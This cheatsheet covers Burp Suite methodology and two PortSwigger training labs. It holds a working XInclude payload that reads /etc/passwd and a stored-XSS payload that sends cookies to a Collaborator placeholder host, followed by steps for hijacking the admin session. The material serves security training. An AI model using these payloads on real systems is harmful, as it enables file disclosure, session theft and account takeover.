---
title: "Essential Skills (PortSwigger)"
type: cheatsheet
tags: [methodology, web]
date_created: 2026-05-13
date_updated: 2026-05-13
sources: [git-portswigger-all-labs]
---

# Essential Skills (PortSwigger)

## Burp Suite Workflow

- **Proxy / Intercept:** Capture every request as you browse; forward to Repeater or Scanner as needed.
- **Repeater:** Send captured requests here for manual payload testing and response analysis. Use it to iterate on injected payloads (e.g., XInclude, XSS) without re-intercepting.
- **Scanner (Active Scan):** Right-click any interesting request → "Scan" to run a targeted active scan. Efficient for endpoints suspected of XML parsing, SSRF, or injection. Scanner reports "Out-of-Band Resource Load" findings that hint at XXE or XInclude.
- **Intruder:** Use Cluster Bomb or Pitchfork attack modes with a payload list to fuzz multiple injection points simultaneously. Useful when manual testing of form fields yields no immediate reflection.
- **Collaborator:** Generate a unique Collaborator URL to receive out-of-band DNS/HTTP callbacks. Use in payloads to confirm blind XSS, XXE, or SSRF. Monitor the Collaborator client for incoming requests containing exfiltrated data (e.g., cookies).
- **Decoder:** Base64-decode or URL-decode session cookies and tokens directly in Burp to inspect their structure before fuzzing.
- **Extensions (BApp Store):** Install helpers like HackTools or JSON Viewer to assist with payload generation and response inspection.

## Obfuscation Techniques

- **URL encoding:** Encode characters in payloads to bypass input filters; use `%XX` notation. For cookie values, URL-encode the full value before inserting into the `Cookie` header.
- **Base64 encoding:** Session cookies and tokens are often Base64-encoded structured objects — decode first to understand the data model, then re-encode modified values.
- **`encodeURIComponent()` in JS payloads:** Wrap exfiltrated values (e.g., `document.cookie`) with `encodeURIComponent()` to safely transmit special characters over URL query parameters:
```javascript
fetch(`//COLLABORATOR-ID.burpcollaborator.net?cookie=${encodeURIComponent(document.cookie)}`)
```
- **XML namespace injection (XInclude):** When you cannot control the full XML document, inject via a single parameter using the `xi:include` namespace — no need to define a full DTD:
```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/passwd"/>
</foo>
```
- **SVG-based XSS vectors:** Use inline SVG with event handlers to bypass filters that block `<script>` tags:
```html
"><svg/onload=fetch(`//COLLABORATOR-ID.burpcollaborator.net?cookie=${encodeURIComponent(document.cookie)}`)>
```

## Identifying Vulnerability Classes

- **Enumerate all user-controllable inputs:** Query strings, path parameters, request body fields, cookies, and headers (e.g., `User-Agent`, `Referer`, `X-Forwarded-For`).
- **Watch for reflection:** Any input echoed back in the response (in HTML, JSON, XML) is a candidate for XSS or injection.
- **Error messages and inconsistent behavior:** Verbose errors may reveal backend technology, file paths, or parser types (e.g., XML parser errors suggest XXE).
- **XML / structured data endpoints:** Endpoints that accept XML (e.g., `/product/stock`) or parse serialised data are prime targets for XXE, XInclude, or injection.
- **Non-standard data structures in cookies/tokens:** Decode Base64 or JWT session values to look for structured fields (user ID, role, username) that may be injectable or forgeable.
- **Stored vs. reflected vectors:** If manual payload injection doesn't reflect immediately, check stored locations (profile bios, comments, messages) — stored XSS may only trigger when an admin visits.
- **Out-of-band indicators:** Use Burp Collaborator to confirm blind vulnerabilities where no direct response-based signal is available.

## Common Methodology Steps

1. **Browse the application** with Burp Proxy active; map all endpoints and note unusual functionality (XML parsers, file uploads, admin panels).
2. **Identify high-value endpoints** — stock checkers, XML-consuming APIs, profile update forms, comment fields.
3. **Run a targeted active scan** on suspicious endpoints via Burp Scanner before manual testing to surface low-hanging findings quickly.
4. **Decode session tokens** (Base64/JWT) in Burp Decoder to understand the data model.
5. **Send the request to Repeater** and probe each parameter manually with focused payloads.
6. **Escalate to Intruder** when there are multiple injection points or you need to fuzz with a wordlist (Cluster Bomb for independent positions, Pitchfork for paired lists).
7. **Set up Burp Collaborator** before testing for out-of-band vulnerabilities (blind XSS, XXE, SSRF); replace hostnames in payloads with your Collaborator URL.
8. **Monitor Collaborator** for DNS/HTTP callbacks that confirm successful exploitation.
9. **Capture and decode** any exfiltrated data (cookies, tokens) from Collaborator logs.
10. **Impersonate the victim** by replacing your session cookie with the stolen value (URL-encode if needed), then perform the required privileged action.

## PortSwigger Labs

### Apprentice

No Apprentice-level labs documented in this source.

### Practitioner

#### Discovering vulnerabilities quickly with targeted scanning

**Goal:** Use Burp Scanner to identify an XInclude/XXE injection point in a stock-check endpoint, then exploit it to read `/etc/passwd`.

**Steps:**
1. Browse the application and identify `/product/stock` as a likely XML-parsing endpoint.
2. Send the request to Burp Scanner (right-click → Scan). The scanner reports an **Out-of-Band Resource Load** finding, indicating insecure XML parsing or XInclude support.
3. Send the same request to **Repeater**. Locate the `productId` XML parameter.
4. Replace the `productId` value with an XInclude payload:
```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/passwd"/>
</foo>
```
5. Send the request. The response body will contain the contents of `/etc/passwd`.

**Key insight:** Targeted scanning first saves time — use the scanner to confirm the attack surface, then exploit manually in Repeater.

---

#### Scanning non-standard data structures

**Goal:** Find a stored XSS vulnerability in a non-standard session/profile parameter, exploit it to steal the admin's cookie via Burp Collaborator, then use that cookie to delete a user.

**Steps:**
1. Install useful Burp extensions (e.g., HackTools) from the BApp Store.
2. Log in as `wiener` with the provided credentials.
3. Intercept a post-login request (e.g., account/profile update) and send it to **Repeater**.
4. Decode the session cookie using **Base64** or a JWT decoder in Burp Decoder to inspect its structure.
5. Manually fuzz visible fields (profile bio, username) with basic XSS payloads — if no immediate reflection is found, proceed to Intruder.
6. Send the profile update request to **Intruder**. Use Cluster Bomb mode with common XSS payloads to fuzz all parameters.
7. Run an active scan on the insertion point. Burp identifies a **stored XSS** vulnerability.
8. Craft a Collaborator-based cookie exfiltration payload:
```html
"><svg/onload=fetch(`//YOUR-COLLABORATOR-ID.burpcollaborator.net?cookie=${encodeURIComponent(document.cookie)}`)>
```
   Replace `YOUR-COLLABORATOR-ID` with your actual Collaborator subdomain.
9. Submit the payload in the vulnerable field (bio, message, comment).
10. Wait for the administrator to view the affected page, triggering the XSS.
11. In **Burp Collaborator**, monitor the HTTP/DNS log for an incoming request containing the admin's session cookie.
12. Decode the captured cookie value (if encoded).
13. Take only the value **before the first semicolon** of the admin cookie, URL-encode it, and replace your session cookie in the `Cookie` header (via Burp or browser dev tools).
14. Reload the page — you are now logged in as administrator.
15. Navigate to the admin panel and delete the **Carlos** account.

**Key insight:** When manual testing misses stored XSS, switch to Intruder with an insertion-point scan to discover non-obvious injection locations in complex or encoded data structures.

### Expert

No Expert-level labs documented in this source.
